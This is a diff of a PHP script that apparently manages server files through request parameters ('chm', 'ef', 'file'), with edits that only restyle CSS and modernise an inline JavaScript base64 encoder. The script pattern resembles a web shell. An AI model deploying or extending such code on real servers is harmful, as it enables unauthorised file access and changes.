@@ -1,16 +1,23 @@
-<?php
+<style>
+    table,
+    th,
+    td {
+        border: 1px solid black;
+        border-collapse: collapse;
+    }
 
-echo "<style>
-table, th, td {
-  border: 1px solid black;
-  border-collapse: collapse;}
-.data-heading td {
-    padding: 8px;
-}
-input, textarea {
-    width: 100%;
-}
-</style>";
+    .data-heading td {
+        padding: 8px;
+    }
+
+    input,
+    textarea {
+        width: 100%;
+    }
+</style>
+
+
+<?php
 
 function isLinux($path)
 {
@@ -302,8 +309,7 @@ if (isset($_REQUEST['chm'])) {
 } elseif (isset($_REQUEST['ef'])) {
     ?>
     <script type="text/javascript">
-        <!--
-        var key = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+        let key = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
 
         function encode64(inpStr) {
             inpStr = escape(inpStr);
@@ -338,8 +344,6 @@ if (isset($_REQUEST['chm'])) {
 
             return output;
         }
-        //
-        -->
     </script>
     <?php
     $_REQUEST['ef'] .= $_REQUEST['file'];
